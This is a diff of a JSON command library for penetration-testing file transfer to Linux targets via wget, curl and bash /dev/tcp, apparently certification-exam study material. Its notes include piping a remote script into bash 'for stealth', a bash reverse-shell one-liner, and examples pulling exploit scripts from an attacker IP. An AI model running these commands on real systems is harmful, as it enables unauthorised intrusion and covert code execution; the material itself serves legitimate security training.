@@ -15,7 +15,6 @@
         "LINUX",
         "DOWNLOAD",
         "WGET",
-        "OSCP:HIGH",
         "QUICK_WIN"
       ],
       "variables": [
@@ -49,7 +48,7 @@
         "-q": "Quiet mode - suppress wget progress output, useful in scripts or low-bandwidth shells",
         "--no-check-certificate": "Skip SSL certificate validation - use for HTTPS with self-signed certs",
         "-P <DIR>": "Download to directory - alternative to -O, saves file with original name in specified directory",
-        "-r": "Recursive download - download entire directory structure (rarely needed in OSCP)",
+        "-r": "Recursive download - download entire directory structure (rarely needed in assessments)",
         "-b": "Background download - continues in background, useful for large files or unstable shells"
       },
       "success_indicators": [
@@ -81,8 +80,7 @@
       "next_steps": [
         "chmod-executable"
       ],
-      "notes": "OSCP METHODOLOGY: First choice for Linux downloads - installed on 99% of systems. Shows progress bar (helpful for large files), auto-retries on failure, supports resume.\n\nMANUAL ALTERNATIVE: Could use browser if GUI access available, or manual HTTP GET via netcat, but wget is almost always available.\n\nEXAM TIP: After download, check file integrity: md5sum <FILE> and compare with source. Make scripts executable: chmod +x <FILE>. If wget unavailable, immediately try curl.\n\nCOMMON DESTINATIONS: /tmp/ (world writable but cleared on reboot), /dev/shm/ (RAM disk, fast), /var/tmp/ (persistent), current directory if writable.\n\nWGET VS CURL: wget is simpler for basic downloads, shows progress, handles recursive downloads better. curl has more features but complex syntax.\n\nTIME ESTIMATE: Near-instant for scripts under 1MB, shows real-time progress for larger files.",
-      "oscp_relevance": "high",
+      "notes": "certification METHODOLOGY: First choice for Linux downloads - installed on 99% of systems. Shows progress bar (helpful for large files), auto-retries on failure, supports resume.\n\nMANUAL ALTERNATIVE: Could use browser if GUI access available, or manual HTTP GET via netcat, but wget is almost always available.\n\nEXAM TIP: After download, check file integrity: md5sum <FILE> and compare with source. Make scripts executable: chmod +x <FILE>. If wget unavailable, immediately try curl.\n\nCOMMON DESTINATIONS: /tmp/ (world writable but cleared on reboot), /dev/shm/ (RAM disk, fast), /var/tmp/ (persistent), current directory if writable.\n\nWGET VS CURL: wget is simpler for basic downloads, shows progress, handles recursive downloads better. curl has more features but complex syntax.\n\nTIME ESTIMATE: Near-instant for scripts under 1MB, shows real-time progress for larger files.",
       "filled_example": "wget http://10.10.14.5:8000/linpeas.sh -O /tmp/linpeas.sh"
     },
     {
@@ -96,8 +94,7 @@
         "FILE_TRANSFER",
         "LINUX",
         "DOWNLOAD",
-        "CURL",
-        "OSCP:HIGH"
+        "CURL"
       ],
       "variables": [
         {
@@ -162,8 +159,7 @@
       "next_steps": [
         "ft-curl-upload"
       ],
-      "notes": "OSCP METHODOLOGY: Second choice for Linux downloads when wget unavailable. More verbose by default but powerful. Available on most modern Linux systems alongside wget.\n\nMANUAL ALTERNATIVE: Could manually construct HTTP GET via netcat or telnet, but curl is almost always available.\n\nCURL VS WGET: curl supports more protocols (HTTP, HTTPS, FTP, SCP, etc.) and has more advanced features, but syntax is more complex. Use curl if you need specific HTTP headers or authentication.\n\nEXAM TIP: Remember lowercase -o for curl (uppercase -O uses remote filename). Add -s for silent mode in scripts. For piped execution: curl http://<IP>/script.sh | bash\n\nIN-MEMORY EXECUTION: Download and execute without saving: curl http://<IP>/script.sh | bash (stealthier, no disk artifacts)\n\nTIME ESTIMATE: Comparable to wget, instant for small files, shows progress for large downloads.",
-      "oscp_relevance": "high",
+      "notes": "certification METHODOLOGY: Second choice for Linux downloads when wget unavailable. More verbose by default but powerful. Available on most modern Linux systems alongside wget.\n\nMANUAL ALTERNATIVE: Could manually construct HTTP GET via netcat or telnet, but curl is almost always available.\n\nCURL VS WGET: curl supports more protocols (HTTP, HTTPS, FTP, SCP, etc.) and has more advanced features, but syntax is more complex. Use curl if you need specific HTTP headers or authentication.\n\nEXAM TIP: Remember lowercase -o for curl (uppercase -O uses remote filename). Add -s for silent mode in scripts. For piped execution: curl http://<IP>/script.sh | bash\n\nIN-MEMORY EXECUTION: Download and execute without saving: curl http://<IP>/script.sh | bash (stealthier, no disk artifacts)\n\nTIME ESTIMATE: Comparable to wget, instant for small files, shows progress for large downloads.",
       "filled_example": "curl http://10.10.14.5:8000/exploit.sh -o /tmp/exploit.sh"
     },
     {
@@ -178,7 +174,6 @@
         "LINUX",
         "DOWNLOAD",
         "BASH",
-        "OSCP:MEDIUM",
         "LIVING_OFF_THE_LAND"
       ],
       "variables": [
@@ -233,8 +228,7 @@
       "next_steps": [
         "bash-reverse-shell"
       ],
-      "notes": "OSCP METHODOLOGY: Last resort for downloads when wget, curl, nc all unavailable or blocked. Uses bash built-in TCP capabilities - no external commands executed, harder to detect in process monitoring.\n\nMANUAL ALTERNATIVE: Could use telnet or other network tools, but /dev/tcp is pure bash.\n\nWHEN TO USE: Extremely restricted environments where all download tools removed/blocked. Relies only on bash and cat (core utilities).\n\nEXAM TIP: On attack machine, use netcat to serve file: nc -lvnp <PORT> < file. On target, immediately run this command. Connection is one-shot - closes after transfer. Check file integrity with md5sum.\n\nLIMITATIONS: No error handling, no resume capability, requires bash (not sh/dash). Some bash builds lack /dev/tcp support (compile-time option).\n\nREVERSE SHELLS: Same technique for shells: bash -i >& /dev/tcp/<IP>/<PORT> 0>&1\n\nTIME ESTIMATE: Instant for small files, but no progress indication. File appears when complete.",
-      "oscp_relevance": "medium",
+      "notes": "certification METHODOLOGY: Last resort for downloads when wget, curl, nc all unavailable or blocked. Uses bash built-in TCP capabilities - no external commands executed, harder to detect in process monitoring.\n\nMANUAL ALTERNATIVE: Could use telnet or other network tools, but /dev/tcp is pure bash.\n\nWHEN TO USE: Extremely restricted environments where all download tools removed/blocked. Relies only on bash and cat (core utilities).\n\nEXAM TIP: On attack machine, use netcat to serve file: nc -lvnp <PORT> < file. On target, immediately run this command. Connection is one-shot - closes after transfer. Check file integrity with md5sum.\n\nLIMITATIONS: No error handling, no resume capability, requires bash (not sh/dash). Some bash builds lack /dev/tcp support (compile-time option).\n\nREVERSE SHELLS: Same technique for shells: bash -i >& /dev/tcp/<IP>/<PORT> 0>&1\n\nTIME ESTIMATE: Instant for small files, but no progress indication. File appears when complete.",
       "filled_example": "cat < /dev/tcp/10.10.14.5/4444 > /tmp/file"
     }
   ]
